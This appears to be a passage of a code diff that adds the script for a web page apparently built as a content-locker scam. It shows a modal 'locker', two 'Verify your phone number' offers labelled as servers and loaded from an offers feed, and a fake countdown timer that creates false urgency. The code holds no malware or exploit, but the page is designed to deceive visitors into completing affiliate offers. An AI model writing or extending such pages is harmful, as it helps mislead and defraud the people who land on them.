+          displayOffers.forEach((offer, idx) => {
+            const offerNumber = idx + 1;
+            const titleText = 'Verify your phone number to continue';
+            const descText = idx === 0 ? 'Server 1' : 'Server 2';
+            const offerUrl = offer.url || '#';
+            const iconUrl = LOCKER_ICON_URL;
+
+            const row = document.createElement('div');
+            row.className = 'offer-row';
+            row.id = `offer-row-${offerNumber}`;
+
+            const offerLeft = document.createElement('div');
+            offerLeft.className = 'offer-left';
+
+            const iconDiv = document.createElement('div');
+            iconDiv.className = 'offer-app-icon';
+            const img = document.createElement('img');
+            img.src = iconUrl;
+            img.alt = 'Verification Icon';
+            img.referrerPolicy = 'no-referrer';
+            iconDiv.appendChild(img);
+            offerLeft.appendChild(iconDiv);
+
+            const textDiv = document.createElement('div');
+            textDiv.className = 'offer-text-content';
+            textDiv.innerHTML = `
+              <h3 class="offer-title">${titleText}</h3>
+              <p class="offer-desc">${descText}</p>
+            `;
+            offerLeft.appendChild(textDiv);
+            row.appendChild(offerLeft);
+
+            const ctaBtn = document.createElement('button');
+            ctaBtn.type = 'button';
+            ctaBtn.className = 'offer-open-btn';
+            ctaBtn.id = `offer-btn-${offerNumber}`;
+            ctaBtn.textContent = 'Verify';
+            ctaBtn.addEventListener('click', (e) => {
+              e.preventDefault();
+              handleOfferClick(offerNumber, offerUrl);
+            });
+            row.appendChild(ctaBtn);
+
+            offersContainer.appendChild(row);
+          });
+        }
+
+        // Try Loading Dynamic Offers Feed
+        async function loadDirectOffers() {
+          try {
+            if (typeof window !== 'undefined' && typeof window.fetch === 'function') {
+              const res = await window.fetch(OFFERS_FEED_URL, { credentials: 'omit' });
+              if (res && res.ok) {
+                const data = await res.json();
+                if (Array.isArray(data) && data.length > 0) {
+                  renderDirectOffers(data.slice(0, 2));
+                  return;
+                }
+              }
+            }
+          } catch (err) {
+            // Fallback used
+          }
+          renderDirectOffers(DEFAULT_OFFERS);
+        }
+
+        // Countdown Timer
+        let totalSeconds = 9 * 60 + 37;
+        const timerEl = document.getElementById('countdown-timer');
+
+        setInterval(() => {
+          if (totalSeconds > 0) {
+            totalSeconds--;
+            const mins = Math.floor(totalSeconds / 60);
+            const secs = totalSeconds % 60;
+            if (timerEl) {
+              timerEl.textContent = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+            }
+          }
+        }, 1000);
+
+        // Pre-rendered Buttons Immediate Click Handlers
+        const btn1 = document.getElementById('offer-btn-1');
+        const btn2 = document.getElementById('offer-btn-2');
+        if (btn1) {
+          btn1.addEventListener('click', (e) => {
+            e.preventDefault();
+            handleOfferClick(1, '#');
+          });
+        }
+        if (btn2) {
+          btn2.addEventListener('click', (e) => {
+            e.preventDefault();
+            handleOfferClick(2, '#');
+          });
+        }
+
+        // Modal Open / Close
+        const openModal = () => {
+          if (!lockerModal) return;
+          lockerModal.classList.add('is-active');
+          lockerModal.setAttribute('aria-hidden', 'false');
+          document.body.style.overflow = 'hidden';
+        };
+
+        const closeModal = () => {
+          if (!lockerModal) return;
+          lockerModal.classList.remove('is-active');
+          lockerModal.setAttribute('aria-hidden', 'true');
+          document.body.style.overflow = '';
+        };
+
+        if (primaryBtn) {
+          primaryBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            e.stopPropagation();
+            openModal();
+          });
+        }
+
+        if (secondaryBtn) {
+          secondaryBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            e.stopPropagation();
+            openModal();
+          });
+        }
+
+        if (modalCloseBtn) {
+          modalCloseBtn.addEventListener('click', (e) => {
+            e.preventDefault();
+            closeModal();
+          });
+        }
+
+        if (modalBackdrop) {
+          modalBackdrop.addEventListener('click', () => {
+            closeModal();
+          });
+        }
+
+        document.addEventListener('keydown', (e) => {
+          if (e.key === 'Escape') {
+            if (menuNavWrapper && menuNavWrapper.classList.contains('is-open')) {
+              menuNavWrapper.classList.remove('is-open');
+              if (menuToggleBtn) menuToggleBtn.setAttribute('aria-expanded', 'false');
+            }
+            if (lockerModal && lockerModal.classList.contains('is-active')) {
+              closeModal();
+            }
+          }
+        });
+
+        loadDirectOffers();
+      });
+    </script>
+  </body>
+</html>
